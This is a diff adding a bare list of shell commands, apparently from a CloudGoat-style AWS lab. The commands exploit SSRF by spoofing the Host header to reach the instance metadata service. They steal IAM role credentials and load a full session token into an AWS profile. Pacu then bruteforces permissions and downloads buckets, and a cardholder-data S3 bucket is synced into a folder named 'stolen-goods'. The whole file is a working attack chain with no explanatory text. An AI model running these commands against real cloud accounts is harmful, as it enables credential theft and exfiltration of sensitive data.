@@ -1,0 +1,24 @@
+curl 3.239.216.119/latest/meta-data/iam/security-credentials --header 'Host: 169.254.169.254'; echo
+
+
+curl 3.239.216.119/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgid2yt4o4tq37 \
+  --header 'Host: 169.254.169.254'
+
+
+aws configure --profile ssrf
+
+
+aws configure --profile ssrf set aws_session_token 'IQoJb3JpZ2luX2VjEOT//////////wEaCXVzLWVhc3QtMSJIMEYCIQD9zHAPhbxbpJWFXy0kYNc196kkZPgrbNAF5XFggowjWAIhAIcdyICeCgu+GsWNMbs7TlGPS15cDi5zlKaEMN43BSqeKoMECJ3//////////wEQABoMNDA4ODQ0MjYyODkyIgyH+IWJb3oJ4oUtyhYq1wMtg6AL83NsnsB9w3Itek1Ywr5+uDodmjKkwcoC2vDy5fuWGg1XsgPo7ToeC6WeDSpWtflXdirt1J+BS95/BbEoaBlSYXRx9s8/tQ7nM9OXWaLGwphl6WntaZf0myE4B2IaJJuyuzA6DAEEXXAWMfecHgjlrSPfPcpPrcVLM7XbU4s7yLpOA/6nzXlPtkG4yRoqi30xdiaqzudbHtH5iYwZcgSy9cjDCRfFlXpxoDj0JunucO3VwxDZnTIH4dtsZBiKU1OnaS1G9sBS7aTUNPZgy2q36qngUNbCZAQsaF8fI8hB0gaDSMbcvbg0JE9v/ydChg846ZpLlLHLoRlJOJ628rFR0VBEngldIPzriU+1TBNYXC925J0pBdSjSDOcqzECCqCKPGTbor9PGCQktIc19P2sWER2okmMh/Mmyhsx1kVLusFI6XkkmsHcoth/6b+dV389uOv5C6J/dykf3r3AJi2qNA65zusYsQ/iOQt0XHRjjhOQ/O9tv0HWBXJtepJG9zEDCqvTlD48NLmyJgGu2/yCoBVmKld5FL/W4E8Xa756E1sbq/ykifiY5xqJTlr3XHD5+3IgGUzui6Twfo1mT4U3l0qOkFhxBEmsGjRavbspH4GgPmMwhJmGhgY6pAE0v80MD9aMedpb7N8p8Yoh6snllCn7RTr9wo0FM/pynCVZdsIY+zAZcRd4/Pw30f397QOIC9dIrQq914FUKoo9YvuGqS3wGnm+U9WQfSYEeCHmIItHf96wWywPXLHXHLBWKhUHTZYGYF/ImP9OWZt5IWxbhWo9WbFm8+9NIt94zG4RvDP3+KKKCVsDLEEmgSyZIYaGLn2kVeBGBVcsew2eIM27XQ=='
+
+
+python3 ./pacu/cli.py
+
+import_keys ssrf
+
+run iam__bruteforce_permissions
+
+run s3__download_bucket
+
+aws s3 sync --profile ssrf s3://cg-cardholder-data-bucket-cgid2yt4o4tq37 stolen-goods
+
+ls -l stolen-goods/
